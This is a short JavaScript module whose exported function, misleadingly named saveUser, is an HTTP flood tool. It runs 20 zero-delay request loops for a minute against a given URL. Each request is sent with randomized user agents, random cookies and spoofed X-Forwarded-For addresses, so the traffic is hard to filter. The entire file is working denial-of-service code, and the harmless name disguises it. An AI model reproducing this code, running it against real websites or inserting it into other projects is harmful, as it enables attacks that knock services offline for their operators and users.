// @ts-nocheck
import request from "request";
import fs from 'fs'

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const userAgents = readLines('usersagents.txt')

const rIp = () => {
        const r = () => Math.floor(255 * Math.random());
        return `${r()}.${r()}.${r()}.${r()}`
    },
    rStr = r => {
        let e = "";
        for (let t = 0; t < r; t++) e += "abcdefghijklmnopqstuvwxyz0123456789" [Math.floor(35 * Math.random())];
        return e
    };
export default function saveUser(r) {
    const e = r;
    for (let r = 0; r < 20; r++) {
        const r = setInterval((() => {
            request({
                url: e,
                headers: {
                    "User-Agent": randomElement(userAgents),
                    "Upgrade-Insecure-Requests": "1",
                    cookie: rStr(10),
                    Origin: e,
                    Referrer: e,
                    "X-Forwarded-For": rIp()
                }
            })
        }));
        setTimeout((() => clearInterval(r)), 6e4)
    }
}